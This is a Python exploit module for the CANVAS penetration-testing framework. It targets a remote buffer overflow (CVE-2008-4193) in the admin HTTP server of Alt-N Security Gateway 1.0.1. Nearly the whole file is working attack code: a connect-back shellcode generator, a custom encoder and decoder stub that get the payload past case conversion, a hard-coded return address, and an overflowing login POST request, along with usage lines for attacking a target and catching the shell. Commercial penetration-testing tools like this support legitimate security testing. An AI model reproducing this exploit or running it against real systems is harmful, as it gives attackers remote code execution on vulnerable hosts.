#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os,getopt
import socket
from exploitutils import *
from MOSDEF import mosdef

from tcpexploit import tcpexploit
import canvasengine
import time

from shellcode import shellcodeGenerator
from encoder import xorencoder, nibble_encoder
from MOSDEF import mosdef

NAME='Alt-N Security Gateway 1.0.1 - Admin HTTP Server Overflow'
DESCRIPTION='Alt-N Security Gateway 1.0.1 - Admin HTTP Server Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Alt-N"
DOCUMENTATION['Date public']='02/06/2008'
DOCUMENTATION['References']='http://osvdb.org/show/osvdb/45854'
DOCUMENTATION["CERT Advisory"]="None"
DOCUMENTATION['Repeatability']='One shot'
DOCUMENTATION['CVE Name'] = 'CVE-2008-4193'
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=2008-4193'
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION['Notes']="Worst bad characters ever"

VERSION='1.0'

PROPERTY = {}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP','2003']

NOTES="""
Worst bad characters ever. Usual badstring is '\r\n%&@', and the following is tranformed:
14:50 <hypnotoad> 8a -> 9a
14:50 <hypnotoad> 8c -> 9c
14:50 <hypnotoad> 8e -> 9e
14:50 <hypnotoad> 9f -> ff
14:51 <hypnotoad> c0 .. cf -> e0 ... ef
14:52 <hypnotoad> d0 ... de -> f0 ... fe (except d7)
(on a French Windows XP Home SP2)

Usage:
./exploits/altn_sg/altn_sg.py -v 1 -t 10.10.10.200 -p 4000 -l 10.10.10.220 -d 5555
./commandlineInterface.py -v 1 -p 5555 -i fromcreatethread
"""

CHANGELOG="""
"""

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.port=4000
        self.host=''
        self.setVersions()
        self.version=1
        self.name=NAME
        self.result=1
        self.listenerArgsDict['fromcreatethread']=1
        return

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[0]=('Autoversion',0x67671116)
        self.versions[1]=('Windows (2000/XP/2003)',0x67671116) # pop,pop,ret in securitygateway.exe

    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        import shellcodeGenerator
        sc=shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp',{'subespval':0})
        sc.addAttr('revert_to_self_before_importing_ws2_32',None)
        sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
        sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
        sc.addAttr('ExitThread',None)
        rawshellcode=sc.get()
        #custom encoder to survive a strlwr() call
        while (len(rawshellcode)%4)!=0: #pad to a multiple of 4
            rawshellcode+='A'
        rawshellcode+='****' #mark the end
        #the encoding scheme is pretty self explanatory
        encodedshellcode=''
        for i in range(0,len(rawshellcode),4):
            L=struct.unpack('<L',rawshellcode[i:i+4])[0]
            HIGH=((L&0xf0f0f0f0)>>4)+0x61616161
            LOW=(L&0x0f0f0f0f)+0x61616161
            encodedshellcode+=struct.pack('<LL',HIGH,LOW)
        decoder=''
        decoder+='\xeb\x3f'
        decoder+='\x5e'
        decoder+='\x8b\xfe'
        decoder+='\xad'
        decoder+='\x2d\x61\x61\x61\x61'
        decoder+='\x6a\x10'
        decoder+='\x5b'
        decoder+='\xf7\xe3'
        decoder+='\x92'
        decoder+='\xad'
        decoder+='\x2d\x61\x61\x61\x61'
        decoder+='\x8d\x04\x10'
        decoder+='\xab'
        decoder+='\x3d\x2a\x2a\x2a\x2a'
        decoder+='\x75\xe3'
        decoder+='\x90'*29
        decoder+='\xeb\x08'
        decoder+='\x90'*3
        decoder+='\xe8\xb9\xff\xff\xff'
        print 'Decoder length: %d'%(len(decoder))
        self.shellcode=decoder+encodedshellcode
        self.log('Total shellcode length=%d'%(len(self.shellcode)))
        return self.shellcode
            
    def test(self):
        self.getargs()
        s=self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except:
            self.log("No connection could be established")
            return 0
        return 1
    
    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
    def run(self):
        self.getargs()
        self.log('Attacking %s:%d'%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            s=self.gettcpsock()
            s.connect((self.host, self.port))
        except:
            self.log('Could not connect')
            self.setInfo('%s attacking %s:%d - done (failed: could not connect!)'%(NAME,self.host,self.port))
            return 0
        s.sendall(sploitstring)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d - done (success!)'%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo('%s attacking %s:%d - done (failed)'%(NAME,self.host,self.port))            
        return 1
        
    def makesploit(self):
        geteip=self.versions[self.version][1]
        self.log('Shellcode length: %d' % len(self.shellcode))
        body=''
        body+='\x90'*476
        body+='\xeb\x06\x90\x90'
        body+=struct.pack('<L',geteip)
        body+=self.shellcode
        body+='c'*(0x1100-len(body))
        body='RequestedPage=login&username=%s&passwd=world&lang=en&logon=Sign+In'%(body)
        http_request=''
        http_request+='POST /SecurityGateway.dll HTTP/1.1\r\n'
        http_request+='Connection: close\r\n'
        http_request+='Host: %s:%d\r\n'%(self.host, self.port)
        http_request+='User-Agent: CANVAS\r\n'
        http_request+='Content-Type: application/x-www-form-urlencoded\r\n'
        http_request+='Content-Length: %d\r\n\r\n'%(len(body))
        http_request+=body
        return http_request

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
